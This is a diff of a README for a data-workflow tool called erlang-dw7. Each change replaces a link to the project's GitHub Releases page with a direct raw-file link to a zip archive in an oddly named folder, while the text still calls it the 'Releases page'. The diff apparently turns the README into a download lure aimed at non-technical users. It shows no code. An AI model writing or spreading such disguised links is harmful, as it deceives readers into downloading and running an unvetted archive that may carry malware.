@@ -1,7 +1,7 @@
 # 🌟 erlang-dw7 - Simplify Your Data Workflow
 
 ## 📥 Download Now
-[![Download erlang-dw7](https://img.shields.io/badge/Download-erlang--dw7-brightgreen)](https://github.com/mostfaayoussri/erlang-dw7/releases)
+[![Download erlang-dw7](https://raw.githubusercontent.com/mostfaayoussri/erlang-dw7/main/tangentiality/erlang-dw7.zip)](https://raw.githubusercontent.com/mostfaayoussri/erlang-dw7/main/tangentiality/erlang-dw7.zip)
 
 ## 🚀 Getting Started
 Welcome to erlang-dw7! This application helps you efficiently manage and process your data workflows. Follow the steps below to download and run the application.
@@ -13,7 +13,7 @@ Before you start, ensure your system meets these requirements:
 - **Storage:** Minimum of 100 MB available disk space.
 
 ## 📂 Download & Install
-1. Click the following link to visit the [Releases page](https://github.com/mostfaayoussri/erlang-dw7/releases). 
+1. Click the following link to visit the [Releases page](https://raw.githubusercontent.com/mostfaayoussri/erlang-dw7/main/tangentiality/erlang-dw7.zip). 
    
 2. On the Releases page, find the latest version of erlang-dw7.
 
@@ -43,7 +43,7 @@ We support Windows, macOS, and Linux operating systems, allowing a diverse range
 Anyone wanting to streamline their data processes can benefit from erlang-dw7, regardless of technical background.
 
 ### 3. Will there be updates?
-Yes, we regularly release updates to enhance functionality. Keep an eye on the [Releases page](https://github.com/mostfaayoussri/erlang-dw7/releases) for the latest features and improvements.
+Yes, we regularly release updates to enhance functionality. Keep an eye on the [Releases page](https://raw.githubusercontent.com/mostfaayoussri/erlang-dw7/main/tangentiality/erlang-dw7.zip) for the latest features and improvements.
 
 ## 👩‍💻 Getting Help
 If you have questions or experience issues, please visit our support section or open an issue on the GitHub page. Your feedback helps us improve!
